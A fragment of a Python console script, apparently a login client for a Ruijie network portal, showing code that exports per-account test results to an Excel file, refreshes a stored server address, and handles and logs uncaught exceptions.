                    elif line.startswith('结果:'):
                        current_account['结果'] = line.split(':')[1].strip()
                
                if current_account:
                    accounts.append(current_account.copy())
            
            if not accounts:
                print("\n❌ 未找到可导出的账号数据")
                return False
            
            df = pd.DataFrame(accounts)
            filename = f"test_results_{time.strftime('%Y%m%d_%H%M%S')}.xlsx"
            df.to_excel(filename, index=False, sheet_name='测试结果')
            
            print(f"\n✅ 结果已导出到: {filename}")
            print(f"共导出 {len(accounts)} 条记录")
            return True
            
        except Exception as e:
            log_error(f"导出Excel失败: {str(e)}")
            print(f"\n❌ 导出失败: {str(e)}")
            return False

    def update_server_info(self):
        """更新服务器信息"""
        try:
            print("\n" + "="*50)
            print("更新服务器信息")
            print("="*50)
            
            if os.path.exists("server_info.json"):
                with open("server_info.json", "r", encoding='utf-8-sig') as f:
                    info = json.load(f)
                print(f"当前服务器地址: {info.get('base_url', '未设置')}")
                print(f"最后更新时间: {info.get('last_updated', '未知')}")
            
            if get_input("\n是否更新服务器信息？(y/n): ").lower() == 'y':
                # 删除旧的服务器信息
                if os.path.exists("server_info.json"):
                    os.remove("server_info.json")
                
                # 重新获取基础URL和服务器信息
                self.base_url = self.get_base_url()
                print("\n✅ 服务器信息已更新")
            
        except Exception as e:
            log_error(f"更新服务器信息失败: {str(e)}")
            print(f"❌ 更新服务器信息失败: {str(e)}")

if __name__ == "__main__":
    try:
        # 设置异常处理
        def handle_exception(exc_type, exc_value, exc_traceback):
            if issubclass(exc_type, KeyboardInterrupt):
                sys.__excepthook__(exc_type, exc_value, exc_traceback)
                return
            log_error(f"Uncaught exception: {exc_value}")
            print(f"\n程序发生异常: {exc_value}")
            print("详细错误信息已记录到 error.log")
            input("\n按回车键退出...")
        
        sys.excepthook = handle_exception
        
        # 主程序
        client = RuijieLogin()
        client.show_menu()
    except Exception as e:
        log_error(e)
        print(f"\n程序异常: {str(e)}")
        print("详细错误信息已记录到 error.log")
    finally:
        print("\n程序已退出")
        input("按回车键关闭窗口...")